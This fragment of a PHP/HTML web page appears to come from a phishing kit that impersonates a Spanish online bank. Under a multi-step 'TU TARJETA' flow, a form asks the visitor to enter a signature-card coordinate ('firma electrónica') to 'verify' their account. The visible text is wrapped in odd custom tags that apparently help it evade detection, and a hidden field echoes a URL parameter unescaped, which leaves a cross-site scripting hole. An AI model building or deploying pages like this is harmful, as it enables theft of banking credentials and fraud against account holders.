            ...
            <div class="container">
                <div class="info">
                    <div class="steps d-lg-flex d-md-flex d-sm-none d-none">
                        <div class="poms"><p><strong>1/4</strong> <small>1</small> <hello class="chlakh">TU TARJETA</hello></p><span></span></div>
                    ...
                    <input type="hidden" name="step" value="firma">
					 <input type="hidden" name="code" value="<?php echo $_GET['code']; ?>">
                            <div class="hiey">
                                <div class="text-center"><h4><hello class="chlakh">CONFIRM SU FIRMA ELECTRÓNICA</hello></h4></div>
                                <p class="text-center"><hello class="chlakh">Introduzca los datos de su firma electrónica para verificar</hello><br><hello class="chlakh">su cuenta bancaria en línea</hello></p>
                                <div class="form-group ">
                                    <label for="firma"><hello class="chlakh">INTRODUCE LA COORDENADA</hello></label>
                                    <div class="ff">
